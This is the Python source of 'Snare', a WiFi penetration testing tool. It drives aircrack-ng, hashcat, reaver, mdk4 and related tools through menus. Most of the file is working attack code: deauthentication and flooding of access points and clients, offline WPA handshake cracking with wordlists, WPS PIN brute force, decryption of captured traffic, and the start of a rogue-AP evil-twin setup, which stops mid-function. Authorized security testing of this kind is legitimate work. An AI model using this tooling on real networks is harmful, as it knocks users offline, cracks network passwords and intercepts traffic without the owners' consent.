#!/usr/bin/env python3
"""
Snare v2.2 - WiFi Penetration Testing Tool
For authorized security testing and educational use only.
"""

import argparse
import logging
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import getpass
from datetime import datetime
from pathlib import Path

# ─── Optional rich UI ─────────────────────────────────────────────────────────

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.align import Align
    RICH = True
    console = Console()
except ImportError:
    RICH = False
    class _FallbackConsole:
        def print(self, *a, **kw):
            import re as _re
            print(_re.sub(r"\[/?[^\]]*\]", "", " ".join(str(x) for x in a)))
        def rule(self, title=""):
            import re as _re
            title = _re.sub(r"\[/?[^\]]*\]", "", title)
            print(f"\n{'─'*20} {title} {'─'*20}")
    console = _FallbackConsole()

try:
    from scapy.all import sniff, wrpcap, Dot11
    SCAPY = True
except ImportError:
    SCAPY = False

# ─── Constants ────────────────────────────────────────────────────────────────

VERSION = "2.2"
REQUIRED_TOOLS = ["airmon-ng", "aireplay-ng", "airdecap-ng", "tshark"]
OPTIONAL_TOOLS = [
    ("airodump-ng",   "Classic AP/client scanner (aircrack-ng suite)", "sudo apt install aircrack-ng"),
    ("hcxdumptool",   "Modern PMKID/handshake capturer",               "sudo apt install hcxdumptool"),
    ("hcxtools",      "Convert hcxdumptool captures for hashcat",       "sudo apt install hcxtools"),
    ("wash",          "WPS network scanner",                            "sudo apt install reaver"),
    ("reaver",        "WPS brute-force",                                "sudo apt install reaver"),
    ("bettercap",     "Swiss-army network tool (ARP, BLE, WiFi)",       "sudo apt install bettercap"),
    ("kismet",        "Passive wireless network detector",              "sudo apt install kismet"),
    ("wifite",        "Automated WiFi audit wrapper",                   "sudo apt install wifite"),
    ("cowpatty",      "WPA/WPA2 offline cracker",                       "sudo apt install cowpatty"),
    ("hashcat",       "GPU-accelerated hash cracker",                   "sudo apt install hashcat"),
    ("john",          "CPU-based password cracker",                     "sudo apt install john"),
    ("hostapd",       "Rogue AP / evil-twin",                           "sudo apt install hostapd"),
    ("dnsmasq",       "DHCP/DNS for rogue AP setups",                   "sudo apt install dnsmasq"),
    ("mdk4",          "WiFi stress / deauth / beacon flood",            "sudo apt install mdk4"),
    ("pixiewps",      "WPS Pixie Dust attack",                          "sudo apt install pixiewps"),
]

BANNER = r"""
  ███████╗███╗   ██╗ █████╗ ██████╗ ███████╗
  ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔════╝
  ███████╗██╔██╗ ██║███████║██████╔╝█████╗
  ╚════██║██║╚██╗██║██╔══██║██╔══██╗██╔══╝
  ███████║██║ ╚████║██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""

# ─── Global state ─────────────────────────────────────────────────────────────

_args = None
_monitor_iface = None
_tmpdir = None       # secure per-session temp directory
_log = None          # session logger

def _get_arg(name, default=None):
    return getattr(_args, name, default) if _args else default

# ─── Session logging ──────────────────────────────────────────────────────────

def _init_logger():
    global _log
    log_dir = Path.home() / ".snare" / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    # Only root can read the log directory
    log_dir.chmod(0o700)
    log_file = log_dir / f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format="%(asctime)s  %(levelname)s  %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    _log = logging.getLogger("snare")
    log_file.chmod(0o600)
    console.print(f"[dim]Session log: {log_file}[/]")

def log(msg):
    if _log:
        _log.info(msg)

# ─── Secure temp directory ────────────────────────────────────────────────────

def _init_tmpdir():
    global _tmpdir
    _tmpdir = tempfile.mkdtemp(prefix="snare_")
    # Only root can read/write
    os.chmod(_tmpdir, 0o700)

def _cleanup_tmpdir():
    global _tmpdir
    if _tmpdir and Path(_tmpdir).exists():
        shutil.rmtree(_tmpdir, ignore_errors=True)
        _tmpdir = None

def tmpfile(name):
    """Return a path inside the secure session temp dir."""
    return str(Path(_tmpdir) / name)

# ─── Input validation ─────────────────────────────────────────────────────────

_MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
_SAFE_FILENAME_RE = re.compile(r"^[A-Za-z0-9_./ -]+$")
_SAFE_SSID_RE = re.compile(r"^[^\x00-\x1f\x7f]{1,32}$")   # no control chars, max 32 chars
_SAFE_CHANNEL_RE = re.compile(r"^\d{1,3}$")

def validate_mac(mac):
    return bool(_MAC_RE.match(mac.strip()))

def validate_filename(path):
    """Reject paths with traversal or shell metacharacters."""
    return bool(_SAFE_FILENAME_RE.match(path)) and ".." not in path

def validate_ssid(ssid):
    """Ensure SSID is safe to embed in a config file."""
    return bool(_SAFE_SSID_RE.match(ssid))

def validate_channel(ch):
    return bool(_SAFE_CHANNEL_RE.match(str(ch))) and 1 <= int(ch) <= 200

def sanitize_ssid(ssid):
    """Strip characters that would break a hostapd config line."""
    return re.sub(r"[\x00-\x1f\x7f\n\r]", "", ssid)[:32]

# ─── Subprocess helpers ───────────────────────────────────────────────────────

def run(cmd, capture=True):
    """Run a command (must be a list). Returns (returncode, stdout, stderr).
    Never accepts strings — forces callers to build explicit argument lists
    and prevents accidental shell-injection via f-string interpolation.
    """
    if not isinstance(cmd, list):
        raise TypeError(f"run() requires a list, got: {type(cmd)}")
    log(f"run: {cmd}")
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError as e:
        return 1, "", str(e)

def run_timed(cmd, duration):
    """Start cmd (a list), let it run for `duration` seconds, then terminate.
    Uses proc.wait(timeout) instead of time.sleep() so SIGINT is responsive.
    """
    if not isinstance(cmd, list):
        raise TypeError(f"run_timed() requires a list")
    log(f"run_timed({duration}s): {cmd}")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        pass
    except KeyboardInterrupt:
        pass
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
    return proc

def run_interactive(cmd):
    """Run a command inheriting the terminal (for TUI tools)."""
    if not isinstance(cmd, list):
        raise TypeError(f"run_interactive() requires a list")
    log(f"run_interactive: {cmd}")
    try:
        subprocess.run(cmd)
    except FileNotFoundError:
        console.print(f"[red][!] Command not found: {cmd[0]}[/]")
    except KeyboardInterrupt:
        pass

# ─── UI helpers ───────────────────────────────────────────────────────────────

def ask(prompt, default=""):
    if RICH:
        return Prompt.ask(prompt, default=default) if default else Prompt.ask(prompt)
    result = input(f"  {prompt}{f' [{default}]' if default else ''}: ").strip()
    return result or default

def confirm(prompt):
    if RICH:
        return Confirm.ask(prompt)
    return input(f"  {prompt} [y/N]: ").strip().lower() in ("y", "yes")

def tool_available(name):
    return shutil.which(name) is not None

def print_banner():
    if RICH:
        console.print(f"[bold cyan]{BANNER}[/]")
        console.print(Align.center(f"[bold white]v{VERSION}[/]  [dim]Authorized use only[/]"))
        console.rule()
    else:
        print(BANNER)
        print(f"Snare v{VERSION}  |  Authorized use only")
        print("─" * 60)

# ─── Startup checks ───────────────────────────────────────────────────────────

def check_root():
    if os.geteuid() != 0:
        console.print("[bold red][!] Snare must be run as root.[/]")
        console.print("    Try:  [bold]sudo python3 Snare.py[/]")
        sys.exit(1)

def check_dependencies():
    missing = [t for t in REQUIRED_TOOLS if not tool_available(t)]
    ok = True
    if missing:
        console.print(f"[bold red][!] Missing required tools:[/] {', '.join(missing)}")
        console.print("    Install:  sudo apt install aircrack-ng tshark")
        ok = False
    if not SCAPY:
        console.print("[bold red][!] Scapy not installed.[/]  pip install scapy")
        ok = False
    return ok

def show_tool_status():
    if RICH:
        t = Table(title="Optional Tool Status", border_style="blue", show_header=True)
        t.add_column("Tool", style="white")
        t.add_column("Status", width=12)
        t.add_column("Description", style="dim")
        t.add_column("Install", style="dim")
        for name, desc, install in OPTIONAL_TOOLS:
            avail = tool_available(name)
            status = "[green]✓ installed[/]" if avail else "[red]✗ missing[/]"
            t.add_row(name, status, desc, "" if avail else install)
        console.print(t)
    else:
        print(f"\n{'Tool':<16} {'Status':<12} Description")
        print("─" * 70)
        for name, desc, _ in OPTIONAL_TOOLS:
            print(f"{name:<16} {'installed' if tool_available(name) else 'missing':<12} {desc}")

# ─── Interface management ─────────────────────────────────────────────────────

def get_wireless_interfaces():
    _, out, _ = run(["iw", "dev"])
    return re.findall(r"Interface\s+(\S+)", out)

def select_interface():
    interfaces = get_wireless_interfaces()
    if not interfaces:
        console.print("[red][!] No wireless interfaces found. Is your adapter plugged in?[/]")
        return None
    if RICH:
        t = Table(title="Wireless Interfaces", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Interface", style="white")
        for i, iface in enumerate(interfaces, 1):
            t.add_row(str(i), iface)
        console.print(t)
    else:
        print("\nAvailable interfaces:")
        for i, iface in enumerate(interfaces, 1):
            print(f"  {i}. {iface}")
    choice = ask("Select interface", default="1")
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(interfaces):
            return interfaces[idx]
    except ValueError:
        pass
    console.print("[red][!] Invalid selection.[/]")
    return None

def enable_monitor_mode(interface):
    global _monitor_iface
    console.print(f"\n[yellow][*] Enabling monitor mode on [bold]{interface}[/]...[/]")
    run(["airmon-ng", "check", "kill"])
    run(["airmon-ng", "start", interface])
    mon = f"{interface}mon"
    all_ifaces = get_wireless_interfaces()
    _monitor_iface = mon if mon in all_ifaces else interface
    log(f"monitor mode enabled: {_monitor_iface}")
    console.print(f"[green][+] Monitor interface ready: [bold]{_monitor_iface}[/][/]")
    return _monitor_iface

def disable_monitor_mode():
    global _monitor_iface
    if not _monitor_iface:
        return
    console.print(f"\n[yellow][*] Restoring [bold]{_monitor_iface}[/] to managed mode...[/]")
    run(["airmon-ng", "stop", _monitor_iface])
    run(["systemctl", "restart", "NetworkManager"])
    log(f"monitor mode disabled: {_monitor_iface}")
    console.print("[green][+] Interface restored.[/]")
    _monitor_iface = None

# ─── Network scanning ─────────────────────────────────────────────────────────

def _parse_airodump_csv(csv_path):
    networks, clients = [], []
    parsing_clients = False
    for line in Path(csv_path).read_text(errors="replace").splitlines():
        if line.startswith("Station MAC"):
            parsing_clients = True
            continue
        parts = [p.strip() for p in line.split(",")]
        if parsing_clients:
            if len(parts) >= 6:
                clients.append({
                    "mac": parts[0],
                    "bssid": parts[5] if parts[5] != "(not associated)" else "—",
                    "probes": parts[6] if len(parts) > 6 else "",
                })
        else:
            if len(parts) >= 14 and validate_mac(parts[0]):
                networks.append({
                    "bssid": parts[0],
                    "channel": parts[3].strip(),
                    "privacy": parts[5].strip(),
                    "power": parts[8].strip(),
                    "essid": parts[13].strip(),
                })
    return networks, clients

def _scan_airodump(monitor_iface, duration):
    out_prefix = tmpfile("airodump")
    console.print(f"[yellow][*] airodump-ng scanning for {duration}s...[/]")
    run_timed(
        ["airodump-ng", "--write", out_prefix, "--output-format", "csv", monitor_iface],
        duration,
    )
    csv_file = f"{out_prefix}-01.csv"
    if not Path(csv_file).exists():
        console.print("[red][!] No scan output. Is monitor mode active?[/]")
        return [], []
    return _parse_airodump_csv(csv_file)

def _scan_hcxdumptool(monitor_iface, duration):
    output_file = tmpfile("hcx_scan.pcapng")
    console.print(f"[yellow][*] hcxdumptool scanning for {duration}s...[/]")
    run_timed(
        ["hcxdumptool", "-i", monitor_iface, "-o", output_file,
         "--enable_status=1", "--disable_client_attacks"],
        duration,
    )
    console.print(f"[green][+] Capture saved to [bold]{output_file}[/][/]")
    console.print(f"[dim]  Convert: hcxpcapngtool -o hashes.hc22000 {output_file}[/]")
    return [], []

def choose_scan_backend():
    backends = []
    if tool_available("airodump-ng"):
        backends.append(("1", "airodump-ng",  "Classic scan — APs, clients, signal"))
    if tool_available("hcxdumptool"):
        backends.append((str(len(backends)+1), "hcxdumptool", "PMKID / handshake harvester"))
    if tool_available("kismet"):
        backends.append((str(len(backends)+1), "kismet",      "Passive wireless IDS"))
    if not backends:
        console.print("[red][!] No scan backends. Install: sudo apt install aircrack-ng[/]")
        return None
    if len(backends) == 1:
        return backends[0][1]
    if RICH:
        t = Table(title="Scan Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Description", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")
    choice = ask("Select backend", default="1")
    for key, name, _ in backends:
        if choice == key:
            return name
    return backends[0][1]

def scan_networks(monitor_iface):
    backend = choose_scan_backend()
    if not backend:
        return [], []
    dur_str = ask("Scan duration (seconds)", default="15")
    try:
        dur = max(1, int(dur_str))
    except ValueError:
        dur = 15
    log(f"scan: backend={backend} duration={dur}s iface={monitor_iface}")
    if backend == "airodump-ng":
        return _scan_airodump(monitor_iface, dur)
    if backend == "hcxdumptool":
        return _scan_hcxdumptool(monitor_iface, dur)
    if backend == "kismet":
        console.print("[yellow][*] Launching Kismet (Ctrl+C to return)...[/]")
        run_interactive(["kismet", "-c", monitor_iface])
        return [], []
    return [], []

def display_networks(networks, clients):
    if not networks:
        console.print("[yellow][!] No networks found.[/]")
        return
    if RICH:
        t = Table(title=f"Found {len(networks)} Networks", border_style="blue", show_header=True)
        t.add_column("#", style="cyan", width=4)
        t.add_column("BSSID", style="white")
        t.add_column("Ch", style="yellow", width=4)
        t.add_column("Encryption", style="magenta")
        t.add_column("Signal", style="green", width=8)
        t.add_column("SSID", style="bold white")
        for i, net in enumerate(networks, 1):
            t.add_row(str(i), net["bssid"], net["channel"], net["privacy"], net["power"],
                      net["essid"] or "[dim](hidden)[/]")
        console.print(t)
        if clients:
            c = Table(title=f"{len(clients)} Clients", border_style="dim", show_header=True)
            c.add_column("Client MAC", style="white")
            c.add_column("Associated AP", style="cyan")
            c.add_column("Probes", style="dim")
            for cl in clients[:30]:
                c.add_row(cl["mac"], cl["bssid"], cl["probes"][:40])
            console.print(c)
    else:
        print(f"\n{'#':<4} {'BSSID':<20} {'Ch':<4} {'Enc':<12} {'Sig':<8} SSID")
        print("─" * 70)
        for i, net in enumerate(networks, 1):
            print(f"{i:<4} {net['bssid']:<20} {net['channel']:<4} {net['privacy']:<12} {net['power']:<8} {net['essid'] or '(hidden)'}")
        if clients:
            print(f"\n{len(clients)} clients detected.")

# ─── Packet capture ───────────────────────────────────────────────────────────

def choose_capture_backend():
    backends = []
    if SCAPY:
        backends.append(("1", "scapy",       "Live capture with per-frame stats (built-in)"))
    if tool_available("hcxdumptool"):
        backends.append((str(len(backends)+1), "hcxdumptool", "PMKID + handshake harvester (pcapng)"))
    if tool_available("tshark"):
        backends.append((str(len(backends)+1), "tshark",      "tshark live capture"))
    if tool_available("tcpdump"):
        backends.append((str(len(backends)+1), "tcpdump",     "tcpdump capture"))
    if not backends:
        console.print("[red][!] No capture backends available.[/]")
        return None
    if len(backends) == 1:
        return backends[0][1]
    if RICH:
        t = Table(title="Capture Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Description", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")
    choice = ask("Select backend", default="1")
    for key, name, _ in backends:
        if choice == key:
            return name
    return backends[0][1]

def _set_channel(monitor_iface, channel):
    if not validate_channel(channel):
        console.print(f"[red][!] Invalid channel: {channel}[/]")
        return False
    run(["iwconfig", monitor_iface, "channel", str(channel)])
    console.print(f"[green][+] Tuned to channel {channel}[/]")
    return True

def capture_scapy(monitor_iface, output_file, channel=None):
    if channel:
        _set_channel(monitor_iface, channel)
    console.print(f"[yellow][*] Capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]\n")
    packets = []
    counts = {"total": 0, "data": 0, "beacon": 0, "probe": 0}

    def handler(pkt):
        if not pkt.haslayer(Dot11):
            return
        counts["total"] += 1
        if pkt.type == 2:
            counts["data"] += 1
        elif pkt.type == 0:
            if pkt.subtype == 8:
                counts["beacon"] += 1
            elif pkt.subtype in (4, 5):
                counts["probe"] += 1
        packets.append(pkt)
        print(
            f"\r  Data:{counts['data']:>5}  Beacon:{counts['beacon']:>5}"
            f"  Probe:{counts['probe']:>5}  Total:{counts['total']:>6}  ",
            end="", flush=True,
        )

    try:
        sniff(iface=monitor_iface, prn=handler, store=False)
    except KeyboardInterrupt:
        print()

    if packets:
        wrpcap(output_file, packets)
        log(f"scapy capture: {len(packets)} packets → {output_file}")
        console.print(f"[green][+] {len(packets)} packets saved to [bold]{output_file}[/][/]")
    else:
        console.print("[yellow][!] No packets captured.[/]")

def capture_hcxdumptool(monitor_iface, output_file, channel=None):
    cmd = ["hcxdumptool", "-i", monitor_iface, "-o", output_file, "--enable_status=1"]
    if channel and validate_channel(channel):
        cmd += ["-c", str(channel)]
    console.print(f"[yellow][*] hcxdumptool capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]")
    run_interactive(cmd)
    if Path(output_file).exists():
        log(f"hcxdumptool capture → {output_file}")
        console.print(f"[green][+] Saved to [bold]{output_file}[/][/]")
        if tool_available("hcxpcapngtool") and confirm("Convert to hashcat format now?"):
            hc_file = str(Path(output_file).with_suffix(".hc22000"))
            run(["hcxpcapngtool", "-o", hc_file, output_file])
            console.print(f"[green][+] Hashcat file: [bold]{hc_file}[/][/]")

def capture_tshark(monitor_iface, output_file, channel=None):
    if channel:
        _set_channel(monitor_iface, channel)
    console.print(f"[yellow][*] tshark capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]")
    run_interactive(["tshark", "-i", monitor_iface, "-w", output_file])

def capture_tcpdump(monitor_iface, output_file, channel=None):
    if channel:
        _set_channel(monitor_iface, channel)
    console.print(f"[yellow][*] tcpdump capturing → [bold]{output_file}[/]  (Ctrl+C to stop)[/]")
    run_interactive(["tcpdump", "-i", monitor_iface, "-w", output_file])

def capture_packets(monitor_iface, default_output=None, default_channel=None):
    backend = choose_capture_backend()
    if not backend:
        return
    default_ext = ".pcapng" if backend == "hcxdumptool" else ".pcap"
    raw_out = default_output or ask("Output filename", default=f"captured{default_ext}")
    if not validate_filename(raw_out):
        console.print("[red][!] Invalid filename. Use only letters, numbers, dots, slashes, hyphens, underscores.[/]")
        return
    out = raw_out
    ch = default_channel or ask("Lock to channel (blank = all channels)")
    log(f"capture: backend={backend} output={out} channel={ch or 'all'}")
    if backend == "scapy":
        capture_scapy(monitor_iface, out, channel=ch if ch else None)
    elif backend == "hcxdumptool":
        capture_hcxdumptool(monitor_iface, out, channel=ch if ch else None)
    elif backend == "tshark":
        capture_tshark(monitor_iface, out, channel=ch if ch else None)
    elif backend == "tcpdump":
        capture_tcpdump(monitor_iface, out, channel=ch if ch else None)

# ─── Decryption ───────────────────────────────────────────────────────────────

def decrypt_traffic(input_file="captured.pcap", output_file="decrypted.pcap"):
    if not Path(input_file).exists():
        console.print(f"[red][!] File not found: {input_file}[/]")
        return
    # Password from CLI arg is a convenience feature; warn that it's in process list
    if _get_arg("password"):
        console.print("[yellow][!] Warning: --password is visible in 'ps aux'. Prefer the interactive prompt for sensitive sessions.[/]")
    wifi_password = _get_arg("password") or getpass.getpass("  WiFi password (hidden): ")
    if not wifi_password:
        console.print("[red][!] Password cannot be empty.[/]")
        return
    ssid_raw = _get_arg("ssid") or ask("Network SSID (blank to skip)")
    console.print("[yellow][*] Decrypting...[/]")
    # Build command as a list — password is a separate element, never interpolated into a string
    cmd = ["airdecap-ng", "-p", wifi_password, input_file, "-o", output_file]
    if ssid_raw:
        cmd += ["-e", ssid_raw]
    log(f"decrypt: input={input_file} output={output_file} ssid={ssid_raw or '(none)'}")
    code, out, err = run(cmd)
    if code == 0:
        console.print(f"[green][+] Decrypted file saved to [bold]{output_file}[/][/]")
        for line in out.splitlines():
            if line.strip():
                console.print(f"  [dim]{line}[/]")
    else:
        console.print("[red][!] Decryption failed. Wrong password or unsupported encryption?[/]")
        if err.strip():
            console.print(f"  [dim]{err.strip()}[/]")

# ─── Data extraction ──────────────────────────────────────────────────────────

def extract_data(pcap_file="decrypted.pcap", output_file="network_data.txt"):
    if not Path(pcap_file).exists():
        console.print(f"[red][!] File not found: {pcap_file}[/]")
        return
    if not validate_filename(output_file):
        console.print("[red][!] Invalid output filename.[/]")
        return
    console.print("[yellow][*] Extracting network data with tshark...[/]")
    fields = [
        "-e", "eth.src", "-e", "eth.dst",
        "-e", "ip.src", "-e", "ip.dst",
        "-e", "tcp.srcport", "-e", "tcp.dstport",
        "-e", "udp.srcport", "-e", "udp.dstport",
    ]
    code, out, err = run(["tshark", "-r", pcap_file, "-T", "fields"] + fields)
    if code != 0:
        console.print(f"[red][!] tshark error:[/] {err.strip()}")
        return
    lines = sorted(set(l for l in out.splitlines() if l.strip()))
    header = "src_mac\t\tdst_mac\t\tsrc_ip\t\tdst_ip\t\ttcp_src\ttcp_dst\tudp_src\tudp_dst"
    with open(output_file, "w") as f:
        f.write(header + "\n" + "─" * 100 + "\n")
        f.write("\n".join(lines))
    log(f"extract_data: {len(lines)} entries → {output_file}")
    console.print(f"[green][+] {len(lines)} unique entries saved to [bold]{output_file}[/][/]")
    if RICH and lines:
        t = Table(title="Network Data Preview (first 20)", border_style="blue", show_header=True)
        for h in ["Src MAC", "Dst MAC", "Src IP", "Dst IP", "TCP Src", "TCP Dst", "UDP Src", "UDP Dst"]:
            t.add_column(h, style="white")
        for line in lines[:20]:
            parts = (line.split("\t") + [""] * 8)[:8]
            t.add_row(*parts)
        console.print(t)

# ─── Deauth / disruption ──────────────────────────────────────────────────────

def choose_deauth_backend():
    backends = []
    if tool_available("aireplay-ng"):
        backends.append(("1", "aireplay-ng", "Standard deauth frames"))
    if tool_available("mdk4"):
        backends.append((str(len(backends)+1), "mdk4",      "Deauth / beacon flood / Michael shutdown"))
    if tool_available("bettercap"):
        backends.append((str(len(backends)+1), "bettercap", "bettercap wifi.deauth (interactive)"))
    if not backends:
        console.print("[red][!] No deauth tools. Install: sudo apt install aircrack-ng[/]")
        return None
    if len(backends) == 1:
        return backends[0][1]
    if RICH:
        t = Table(title="Deauth Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Description", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")
    choice = ask("Select backend", default="1")
    for key, name, _ in backends:
        if choice == key:
            return name
    return backends[0][1]

def deauth_attack(monitor_iface, networks=None):
    console.print("\n[bold red][ Deauthentication / Disruption Attack ][/]")
    console.print("[dim]Disconnects clients from an AP by sending deauth/disassoc frames.[/]\n")
    backend = choose_deauth_backend()
    if not backend:
        return
    if backend == "mdk4":
        _deauth_mdk4(monitor_iface)
        return
    if backend == "bettercap":
        run_interactive(["bettercap", "-iface", monitor_iface])
        return

    gateway_mac = ""
    if networks and confirm("Pick AP from last scan?"):
        display_networks(networks, [])
        choice = ask("Select network #", default="1")
        try:
            net = networks[int(choice) - 1]
            gateway_mac = net["bssid"]
            console.print(f"[green][+] Using AP: {net['essid']} ({gateway_mac})[/]")
        except (ValueError, IndexError):
            console.print("[yellow][!] Invalid selection, enter MAC manually.[/]")

    if not gateway_mac:
        gateway_mac = ask("Gateway / AP MAC address")
    if not validate_mac(gateway_mac):
        console.print("[red][!] Invalid MAC. Format: AA:BB:CC:DD:EE:FF[/]")
        return

    target_mac = ask("Target client MAC (FF:FF:FF:FF:FF:FF = all)", default="FF:FF:FF:FF:FF:FF")
    if not validate_mac(target_mac):
        console.print("[red][!] Invalid MAC.[/]")
        return

    count_str = ask("Number of deauth frames", default="50")
    try:
        count = max(1, int(count_str))
    except ValueError:
        count = 50

    console.print(f"\n[yellow][*] Sending {count} deauth frames via aireplay-ng[/]")
    console.print(f"    AP     → [bold]{gateway_mac}[/]")
    console.print(f"    Target → [bold]{target_mac}[/]")
    log(f"deauth: ap={gateway_mac} target={target_mac} count={count} iface={monitor_iface}")

    code, out, err = run(["aireplay-ng", "--deauth", str(count),
                          "-a", gateway_mac, "-c", target_mac, monitor_iface])
    if code == 0:
        console.print("[green][+] Deauth attack complete.[/]")
    else:
        console.print("[red][!] Attack failed.[/]")
        if err.strip():
            console.print(f"  [dim]{err.strip()}[/]")

def _deauth_mdk4(monitor_iface):
    console.print("[dim]mdk4 modes: d=deauth, b=beacon flood, m=Michael shutdown, a=auth flood[/]")
    mode = ask("mdk4 mode", default="d")
    if not re.match(r"^[a-zA-Z]$", mode):
        console.print("[red][!] Invalid mode.[/]")
        return
    # Extra args come from user; they go to a trusted local tool, not a shell
    extra_raw = ask("Extra mdk4 arguments (blank for defaults)")
    cmd = ["mdk4", monitor_iface, mode]
    if extra_raw:
        # Split but do NOT pass through shell — each token becomes its own argv element
        cmd += extra_raw.split()
    console.print(f"[yellow][*] Running mdk4 (Ctrl+C to stop)...[/]")
    log(f"mdk4: mode={mode} iface={monitor_iface}")
    run_interactive(cmd)

# ─── Handshake cracking ───────────────────────────────────────────────────────

def crack_handshake():
    console.print("\n[bold yellow][ Handshake / Hash Cracking ][/]")
    console.print("[dim]Offline password recovery from a captured handshake.[/]\n")
    backends = []
    if tool_available("hashcat"):
        backends.append(("1", "hashcat",     "GPU-accelerated (hc22000 format)"))
    if tool_available("john"):
        backends.append((str(len(backends)+1), "john",       "CPU-based (john the ripper)"))
    if tool_available("cowpatty"):
        backends.append((str(len(backends)+1), "cowpatty",   "WPA-PSK offline cracker"))
    if tool_available("aircrack-ng"):
        backends.append((str(len(backends)+1), "aircrack-ng","WPA handshake cracker"))
    if not backends:
        console.print("[red][!] No cracking tools. Install: sudo apt install hashcat aircrack-ng[/]")
        return
    if RICH:
        t = Table(title="Cracking Backends", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Notes", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")

    choice = ask("Select tool", default="1")
    selected = backends[0][1]
    for key, name, _ in backends:
        if choice == key:
            selected = name
            break

    default_wl = _get_arg("wordlist") or "/usr/share/wordlists/rockyou.txt"
    wordlist = ask("Path to wordlist", default=default_wl)
    if not validate_filename(wordlist):
        console.print("[red][!] Invalid wordlist path.[/]")
        return
    if not Path(wordlist).exists():
        console.print(f"[yellow][!] Wordlist not found: {wordlist}[/]")

    log(f"crack: tool={selected} wordlist={wordlist}")

    if selected == "hashcat":
        hash_file = ask("Hash file (.hc22000 from hcxpcapngtool)")
        if not validate_filename(hash_file):
            console.print("[red][!] Invalid path.[/]")
            return
        run_interactive(["hashcat", "-m", "22000", hash_file, wordlist, "--force"])
    elif selected == "john":
        pcap = ask("Capture file (pcap/pcapng)")
        if not validate_filename(pcap):
            console.print("[red][!] Invalid path.[/]")
            return
        run_interactive(["john", f"--wordlist={wordlist}", pcap])
    elif selected == "cowpatty":
        pcap = ask("Capture file (.pcap)")
        ssid = ask("Target SSID")
        if not validate_filename(pcap):
            console.print("[red][!] Invalid path.[/]")
            return
        run_interactive(["cowpatty", "-r", pcap, "-f", wordlist, "-s", ssid])
    elif selected == "aircrack-ng":
        pcap = ask("Capture file (.pcap containing handshake)")
        if not validate_filename(pcap):
            console.print("[red][!] Invalid path.[/]")
            return
        run_interactive(["aircrack-ng", "-w", wordlist, pcap])

# ─── WPS attacks ──────────────────────────────────────────────────────────────

def wps_attack(monitor_iface):
    console.print("\n[bold yellow][ WPS Attacks ][/]")
    if tool_available("wash") and confirm("Scan for WPS-enabled networks first?"):
        console.print("[yellow][*] Running wash (Ctrl+C to stop)...[/]")
        run_interactive(["wash", "-i", monitor_iface])

    backends = []
    if tool_available("reaver"):
        backends.append(("1", "reaver",   "WPS PIN brute-force"))
    if tool_available("pixiewps"):
        backends.append((str(len(backends)+1), "pixiewps", "Pixie Dust offline attack"))
    if not backends:
        console.print("[red][!] No WPS tools. Install: sudo apt install reaver pixiewps[/]")
        return

    if RICH:
        t = Table(title="WPS Tools", show_header=True, border_style="blue")
        t.add_column("#", style="cyan", width=4)
        t.add_column("Tool", style="white")
        t.add_column("Type", style="dim")
        for key, name, desc in backends:
            t.add_row(key, name, desc)
        console.print(t)
    else:
        for key, name, desc in backends:
            print(f"  {key}. {name} — {desc}")

    choice = ask("Select tool", default="1")
    bssid = ask("Target AP BSSID")
    if not validate_mac(bssid):
        console.print("[red][!] Invalid BSSID.[/]")
        return

    log(f"wps: bssid={bssid} iface={monitor_iface}")
    if choice == "1" and tool_available("reaver"):
        cmd = ["reaver", "-i", monitor_iface, "-b", bssid, "-vv"]
        if tool_available("pixiewps") and confirm("Use Pixie Dust mode (-K)?"):
            cmd += ["-K"]
        run_interactive(cmd)
    elif tool_available("pixiewps"):
        console.print("[dim]pixiewps needs values from reaver -vv output. Use reaver -K for automated Pixie Dust.[/]")

# ─── Rogue AP ─────────────────────────────────────────────────────────────────

def rogue_ap(managed_iface):
    console.print("\n[bold yellow][ Rogue AP / Evil Twin ][/]")
    console.print("[dim]Requires hostapd + dnsmasq.[/]\n")
    if not tool_available("hostapd"):
        console.print("[red][!] hostapd not found.  sudo apt install hostapd[/]")
        return
    if not tool_available("dnsmasq"):
        console.print("[red][!] dnsmasq not found.  sudo apt install dnsmasq[/]")
        return

    ssid_raw = ask("SSID for fake AP")
    ssid = sanitize_ssid(ssid_raw)
    if not validate_ssid(ssid):
        console.print("[red][!] SSID contains invalid characters.[/]")
